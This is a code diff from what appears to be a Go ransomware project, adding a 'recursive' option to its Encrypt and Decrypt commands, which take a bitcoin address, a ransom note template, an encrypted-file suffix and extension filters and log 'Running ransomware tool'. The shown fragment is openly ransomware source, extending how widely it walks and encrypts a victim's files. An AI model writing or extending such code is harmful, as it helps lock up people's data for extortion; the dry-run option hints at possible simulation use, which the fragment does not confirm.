@@ -48,6 +48,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	bitcoinAddress := ctx.String("bitcoinAddress")
 	skipHidden := ctx.Bool("skipHidden")
 	dryRun := ctx.Bool("dryRun")
+	recursive := ctx.Bool("recursive")
 	workers := ctx.Int("workers")
 	extBlacklist := splitCommaSeparated(ctx.String("extBlacklist"))
 	extWhitelist := splitCommaSeparated(ctx.String("extWhitelist"))
@@ -83,6 +84,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	log.Printf("Blacklisted extensions = %v", extBlacklist)
 	log.Printf("Whitelisted extensions = %v", extWhitelist)
 	log.Printf("Skipping hidden files/folders = %t", skipHidden)
+	log.Printf("Recursive = %t", recursive)
 	log.Printf("DryRun enabled = %t", dryRun)
 	log.Printf("Workers = %d", workers)
 	log.Printf("EncSuffix = %s", encSuffix)
@@ -93,7 +95,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	log.Printf("Ransom file template = %s", ransomTemplatePath)
 	log.Printf("Ransom file name = %s", ransomFileName)
 
-	files, err := fs.WalkAndCollect(absolutePath, extBlacklist, extWhitelist, skipHidden)
+	files, err := fs.WalkAndCollect(absolutePath, extBlacklist, extWhitelist, skipHidden, recursive)
 	if err != nil {
 		return err
 	}
@@ -122,6 +124,7 @@ func Decrypt(ctx *urfavecli.Context) error {
 	privateKeyPath := ctx.String("privateKey")
 	dryRun := ctx.Bool("dryRun")
 	skipHidden := ctx.Bool("skipHidden")
+	recursive := ctx.Bool("recursive")
 	workers := ctx.Int("workers")
 	encSuffix := ctx.String("encSuffix")
 	ransomFileName := ctx.String("ransomFileName")
@@ -141,12 +144,13 @@ func Decrypt(ctx *urfavecli.Context) error {
 	log.Printf("Running ransomware tool on %s", absolutePath)
 	log.Printf("EncSuffix = %s", encSuffix)
 	log.Printf("DryRun enabled = %t", dryRun)
+	log.Printf("Recursive = %t", recursive)
 	log.Printf("Workers = %d", workers)
 	log.Printf("Whitelisted extensions = %v", extWhitelist)
 	log.Printf("Ransom file name = %s", ransomFileName)
 	log.Printf("Skipping hidden files/folders = %t", skipHidden)
 
-	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden)
+	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden, recursive)
 	if err != nil {
 		return err
 	}
